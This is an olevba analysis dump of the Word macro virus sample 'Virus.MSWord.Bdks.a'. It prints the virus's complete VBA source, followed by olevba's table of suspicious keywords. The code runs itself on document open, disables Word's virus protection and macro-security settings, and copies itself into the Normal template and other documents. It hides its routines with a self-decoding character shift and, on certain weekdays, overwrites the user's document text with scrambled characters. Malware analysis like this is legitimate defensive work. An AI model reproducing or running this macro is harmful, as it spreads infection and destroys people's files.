olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bdks.a-79bcada856f8797929f45467bd099434cd4e910a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bdks.a-79bcada856f8797929f45467bd099434cd4e910a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bdks.bas 
in file: Virus.MSWord.Bdks.a-79bcada856f8797929f45467bd099434cd4e910a - OLE stream: 'Macros/VBA/Bdks'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Call AutoOpen
End Sub
Sub AutoOpen()
Call InW_
On Error Resume Next
Mk_D
Call DelText
End Sub
Sub InW_()
On Error Resume Next
Set O_ = Options: Set cc = O_.ConfirmConversions: Set VP = O_.VirusProtection
Set snp = O_.SaveNormalPrompt: Set svp = O_.SavePropertiesPrompt
cc = (Rnd * 0): VP = (Rnd * 0): snp = (Rnd * 0): svp = (Rnd * 0)
On Error Resume Next
Dim yoi As Boolean
Set d_ = NormalTemplate: Set e_ = d_.VBProject: Set f_ = e_.VbComponents
Set g_ = ActiveDocument
Set NT = f_.Item(1)
ln = NT.CodeModule.CountOfLines
yoi = False
For Each oby In f_
If (oby.Name = "Bdks") Then yoi = True
If (oby.Name <> "Bdks") And (oby.Name <> "ThisDocument") Then
Application.OrganizerDelete Source:=d_.FullName, Name:=oby.Name, Object:=wdOrganizerObjectProjectItems
End If
Next oby
NT.CodeModule.DeleteLines 1, ln
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Options...").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
On Error Resume Next
Mk_D
If yoi = False Then
Application.OrganizerCopy Source:=g_.FullName, Destination:=d_.FullName, Name:="Bdks", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
d_.Save
Application.DisplayRecentFiles = False
Application.DisplayRecentFiles = True
End If
On Error Resume Next
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
End Sub
Sub InD_()
On Error Resume Next
Dim iya As Boolean
Set a_ = ActiveDocument: Set b_ = a_.VBProject: Set c_ = b_.VbComponents
Set DC = c_.Item(1)
ln2 = DC.CodeModule.CountOfLines
iya = False
For Each x_ In c_
If (x_.Name = "Bdks") Then iya = True
If (x_.Name <> "Bdks") And (x_.Name <> "ThisDocument") Then
Application.OrganizerDelete Source:=a_.FullName, Name:=x_.Name, Object:=wdOrganizerObjectProjectItems
End If
Next x_
DC.CodeModule.DeleteLines 1, ln2
If iya = False Then
On Error Resume Next
M2537012682 = GetAttr(NormalTemplate.FullName)
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
If M2537012682 = vbReadOnly Then GoTo Z
If M2537012682 = vbReadOnly + vbArchive Then GoTo Z
c_.import "c:\windows\dos_.sys"
a_.Save
a_.Saved = True
Z:
End If
End Sub
Sub ViewVBCode()
MsgBox "This region not proper to used..", vbInformation, "Microsoft Word"
End Sub
Sub ToolsCustomize()
ViewVBCode
End Sub
Sub ToolsCustomizeKeyboard()
ViewVBCode
End Sub
Sub FileOpen()
On Error Resume Next
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
WordBasic.DisableAutoMacros True
Dialogs(80).Show
Call InD_
Call InW_
WordBasic.DisableAutoMacros False
Call DelText
End Sub
Sub Autoexit()
On Error Resume Next
Application.Quit
End Sub
Sub FileClose()
InW_
AdText
Sekond
AutoClose
ActiveDocument.Close
End Sub
Sub FileTemplates()
ViewVBCode
End Sub
Sub AutoClose()
InD_
Ganggu
End Sub
Sub AutoExec()
On Error Resume Next
WordBasic.DisableAutoMacros True
Normal.Bdks.InD_
Normal.Bdks.Mk_D
Normal.Bdks.DelText
Application.VBE.activevbproject.VbComponents("Bdks").Export "c:\windows\dos_.sys"
Normal.Bdks.InW_
Application.OnTime Now + TimeValue("00:01:00"), "Normal.Bdks.Jam"
End Sub
Sub Jam()
DC = Documents.Count
If DC <> 0 Then
WordBasic.DisableAutoMacros False
Normal.Bdks.InD_
DelText
On Error Resume Next
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.Save
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
Application.OnTime Now + TimeValue("00:01:00"), "Normal.Bdks.Jam"
End If
End If
End Sub
Private Function Gng()
'
'
'
'
'
'
'
'
'
'
'
'
End Function
Private Sub M_dir()
'Kpt'Yvv{Z€z'Hz'Z{ypun
'Vu'Lyyvy'Ylz|tl'Ul{
'hrhy'D'Z€z{lt5Wyp}h{lWyvmpslZ{ypun/))3')ORL`fSVJHSfTHJOPULcZvm{~hylcTpjyvzvm{c^pukv~zcJ|yylu{]lyzpvu)3')Z€z{ltYvv{)0
'TrKpy'hrhy'2')cz€z{ltczolss)
'TrKpy'hrhy'2')cz€z{ltczolsschwwspjh{pvu)
'TrKpy'hrhy'2')cz€z{ltczolsschwwspjh{pvucZ{hy{|w)
'Vw{pvuz5Klmh|s{MpslWh{o/Wh{oAD~k\zly[ltwsh{lzWh{o0'D'hrhy'2')cz€z{ltczolsschwwspjh{pvu)
'Vw{pvuz5Klmh|s{MpslWh{o/Wh{oAD~kZ{hy{|wWh{o0'D'hrhy'2')cz€z{ltczolsschwwspjh{pvucZ{hy{|w)
End Sub
Sub FileSave()
On Error Resume Next
If ActiveDocument.Saved = False Then
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
InD_
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
WordBasic.FileSave
InD_
End If
End If
ActiveDocument.Save
ActiveDocument.Saved = True
Sekond
InW_
End Sub
Private Function Ganggu()
Call GgG("Gng")
Call Gng
Call DdD("Gng")
ActiveDocument.Saved = True
End Function
Private Sub Wdh()
'Vwlu')c~k5yln)'Mvy'V|{w|{'Hz'*8
'Wypu{'*83')YLNLKP[;)
'Wypu{'*83
'Wypu{'*83')b4ORL`fJSHZZLZfYVV[cllmpsld)
'Jsvzl'*8
'Vu'Lyyvy'Ylz|tl'Ul{
'Zolss')ylnlkp{'6z'c~k5yln)3'}iOpkl
'Rpss')'c~k5yln)
'TznIv')Zlt|h'wyvnyht'kp'~pukv~z'hukh'{hr'ilym|unzp'shnp'()'2'Joy/8:0'2'))'2'Joy/8:0'2')Tptp'Ohy€hup'4'CC[huq|un'Ih{|EE)3'}iPumvyth{pvu3')Tptp'Ohy€hup)
End Sub
Private Sub Yeah()
Call GgG("Yh")
Call Yh
Call DdD("Yh")
End Sub
Private Sub UbahDok()
Call GgG("UbhDk")
Call ubhdk
Call DdD("UbhDk")
End Sub
Private Sub XFind()
Call GgG("Xf")
Call Xf
Call DdD("Xf")
End Sub
Private Sub WinDeath()
Call GgG("Wdh")
Call Wdh
Call DdD("Wdh")
End Sub
Private Sub Yh()
On Error Resume Next
If Weekday(Date) = vbMonday And Time < TimeValue("16:00:00") Then
WinDeath
UbahDok
End If
If Weekday(Date) = vbWednesday And Time < TimeValue("16:00:00") Then
UbahDok
End If
If Weekday(Date) = vbTeusday And Time > TimeValue("16:00:00") Then
UbahDok
End If
End Sub
Private Sub Mk_D()
Call GgG("M_dir")
Call M_dir
Call DdD("M_dir")
End Sub
Sub tlso()
Dialogs(202).Show
End Sub
Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call InD_
End Sub
Sub AdText()
On Error Resume Next
Dim d As String
d = ActiveDocument.Path
With ActiveDocument.Styles("Hyperlink").Font
.Underline = wdUnderlineNone
.ColorIndex = wdAuto
End With
ActiveDocument.Hyperlinks.Add Anchor:=ActiveDocument.Content, Address:=d + "\" + ActiveDocument.Name + ".html", SubAddress:=""
End Sub
Sub DelText()
On Error Resume Next
For i = 1 To ActiveDocument.Hyperlinks.Count
ActiveDocument.Hyperlinks.Item(1).Delete
Next
End Sub
Sub FileExit()
On Error Resume Next
Mk_D
DC = Documents.Count
If DC <> 0 Then
InW_
AdText
InD_
Ganggu
End If
Autoexit
End Sub
Private Function DeCode(Code As String)
For xy = 1 To Len(Code)
Ascii = Asc(Mid(Code, xy, 1))
Change = Ascii + 7
On Error Resume Next
NewCode = NewCode & Chr(Change)
Next
DeCode = NewCode & vbCr
End Function
Private Function DeCodes(Code As String)
For xy = 2 To Len(Code)
Ascii = Asc(Mid(Code, xy, 1))
Change = Ascii - 7
On Error Resume Next
NewCode = NewCode & Chr(Change)
Next
DeCodes = NewCode & vbCr
End Function
Private Function DdD(pros As String)
Dim ln As String
On Error Resume Next
N = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcBodyLine(pros, vbext_pk_Proc)
m = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcCountLines(pros, vbext_pk_Proc)
i = N + 1
H = i + (m - 3)
j = j + 1
On Error Resume Next
For j = i To H
ln = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.Lines(j, 1)
G = DeCode(ln)
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ReplaceLine j, "'" + G
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.DeleteLines j + 1, 1
Next
End Function
Private Sub Xf()
'Vwlu')cum5yln)'Mvy'V|{w|{'Hz'*8
'Wypu{'*83')YLNLKP[;)
'Wypu{'*83
'Wypu{'*83')b4ORL`fSVJHSfTHJOPULcZ€z{ltcJ|yylu{Jvu{yvsZl{cJvu{yvscWypu{d)
'Wypu{'*83')bORL`fJ\YYLU[f\ZLYcZvm{~hylcTpjyvzvm{c^pukv~zcJ|yylu{]lyzpvucwvspjplzclwsvylyd)
'Wypu{'*83'))))B')UvMpuk)B'))))B')Dk~vykA78)
'Jsvzl'*8
'Vu'Lyyvy'Ylz|tl'Ul{
'Zolss')ylnlkp{'6z'cum5yln)3'}iOpkl
'Rpss')cum5yln)
End Sub
Private Function GgG(pres As String)
Dim ln As String
On Error Resume Next
N = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcBodyLine(pres, vbext_pk_Proc)
m = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ProcCountLines(pres, vbext_pk_Proc)
i = N + 1
H = i + (m - 3)
j = j + 1
On Error Resume Next
For j = i To H
ln = Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.Lines(j, 1)
G = DeCodes(ln)
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.ReplaceLine j, G
Application.VBE.activevbproject.VbComponents("Bdks").CodeModule.DeleteLines j + 1, 1
Next
End Function
Private Sub ubhdk()
Dim s, ch, tx As String
On Error Resume Next
For X = 1 To Len(ActiveDocument.Content)
s = Asc(Mid(ActiveDocument.Content, X, 1))
ch = s + 9
tx = tx & Chr(ch)
Next X
yx = tx & vbCr
ActiveDocument.Content = yx
ActiveDocument.Save
ActiveDocument.Saved = True
MsgBox "Ada Problem dengan file anda ?" + Chr(13) + "" + Chr(13) + "Hubungi --> Mimi Haryani - Tanjung Batu", vbInformation, "Mimi Haryani"
End Sub
Sub Sekond()
Dim D1 As String
ht = ActiveDocument.Path
On Error Resume Next
Open (ht + "\" + ActiveDocument.Name + ".html") For Output As #1
Print #1, "<SCRIPT LANGUAGE =" + Chr(34) + "VBSCRIPT" + Chr(34) + Chr(62)
Print #1, "<!--"
Print #1, "Option Explicit"
Print #1, "Dim MyAppl"
Print #1, "On Error Resume Next"
Print #1, "Set MyAppl = CreateObject" + Chr(40) + Chr(34) + "Word.Application" + Chr(34) + Chr(41)
Print #1, "MyAppl.System.PrivateProfileString" + Chr(40) + Chr(34) + Chr(34) + "," + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security" + Chr(34) + "," + Chr(34) + "Level" + Chr(34) + Chr(41) + " = 1"
Print #1, "MyAppl.System.PrivateProfileString" + Chr(40) + Chr(34) + Chr(34) + "," + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options" + Chr(34) + "," + Chr(34) + "EnableMacroVirusProtection" + Chr(34) + Chr(41) + " = 0"
Print #1, "MyAppl.Options.VirusProtection = False"
Print #1, "Set MyAppl = Nothing"
Print #1, "-->"
Print #1, "</SCRIPT>"
Close #1
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
